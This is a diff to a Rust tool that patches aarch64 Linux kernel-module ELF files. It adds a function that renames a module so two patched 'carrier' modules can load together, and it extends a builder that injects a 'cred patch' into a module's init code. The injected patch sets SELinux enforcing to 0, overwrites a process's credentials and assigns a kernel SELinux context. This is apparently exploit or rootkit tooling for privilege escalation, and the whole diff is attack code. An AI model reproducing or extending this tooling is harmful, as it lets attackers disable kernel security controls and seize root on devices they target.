@@ -3,7 +3,7 @@
 // Pure Rust ELF manipulation — no clang, no llvm-objcopy/readelf.
 #![allow(dead_code)]
 use crate::elf::{Elf, R_AARCH64_ABS64, R_AARCH64_CALL26};
-use crate::emit::{build_patch_init, cred_patch};
+use crate::emit::{build_patch_init, cred_patch_ex};
 
 /// Q3 two-carrier flow: splice the 52-byte enforcing-only init patch into the carrier's .init.text,
 /// repoint the CALL26 anchor reloc's r_offset, NONE the other in-region relocs. Returns patched bytes.
@@ -51,12 +51,36 @@ pub fn build_cfg(orig: Vec<u8>, insmod_path: &str, inject_off: usize, inject_len
     Ok((orig, patched))
 }
 
+/// Rename the module (struct module.name is a char[56] at +24 in .gnu.linkonce.this_module: after
+/// `enum module_state state` (4+4 pad) and `struct list_head list` (16)). Lets the Phase-B cred carrier
+/// load under a distinct name while the Phase-A enforcing carrier (same base .ko) is still loaded.
+pub fn rename_module(carrier_bytes: Vec<u8>, new_name: &str) -> Result<Vec<u8>, String> {
+    const NAME_OFF: usize = 24;
+    const NAME_LEN: usize = 56;
+    let nb = new_name.as_bytes();
+    if nb.len() >= NAME_LEN { return Err(format!("module name '{}' too long (max {})", new_name, NAME_LEN - 1)); }
+    let mut e = Elf::parse(carrier_bytes)?;
+    let tm = e.sec(".gnu.linkonce.this_module").ok_or("no .gnu.linkonce.this_module")?.clone();
+    if tm.size < NAME_OFF + NAME_LEN { return Err("this_module section too small for name field".into()); }
+    let base = tm.off + NAME_OFF;
+    for i in 0..NAME_LEN { e.data[base + i] = 0; }
+    e.data[base..base + nb.len()].copy_from_slice(nb);
+    Ok(e.data)
+}
+
 /// Merged cred carrier. Diff-patch the carrier's init into cred_patch, rewriting the CALL26 anchor to
 /// R_AARCH64_ABS64 at the anchor64 slot; auto-selects .init.text mode or .text-splice (small init).
 /// deltas are signed 32-bit. ctx=Some(off) also sets SELinux context -> kernel.
 pub fn build_credmod(carrier_bytes: Vec<u8>, dsel: i64, dfv: i64, dpt: i64, pid: i64, dssuse: i64,
                      enf_off: u32, cred_off: u32, ctx: Option<u32>) -> Result<(Vec<u8>, String), String> {
-    let (patch, anchor_local) = cred_patch(dsel, dfv, dpt, pid, dssuse, enf_off, cred_off, ctx);
+    build_credmod_ex(carrier_bytes, dsel, dfv, dpt, pid, dssuse, enf_off, cred_off, ctx, false)
+}
+
+/// enforcing_only=true builds the small Phase-A carrier (enforcing=0 + status-sync only) for the split
+/// flow. Same diff-injection mechanics; the shorter patch yields far fewer diff bytes.
+pub fn build_credmod_ex(carrier_bytes: Vec<u8>, dsel: i64, dfv: i64, dpt: i64, pid: i64, dssuse: i64,
+                     enf_off: u32, cred_off: u32, ctx: Option<u32>, enforcing_only: bool) -> Result<(Vec<u8>, String), String> {
+    let (patch, anchor_local) = cred_patch_ex(dsel, dfv, dpt, pid, dssuse, enf_off, cred_off, ctx, enforcing_only);
     let mut e = Elf::parse(carrier_bytes)?;
     let it = e.sec(".init.text").ok_or("no .init.text")?.clone();
     let anchor_off = it.off + anchor_local; // absolute file offset later? -> reloc r_offset is section-relative
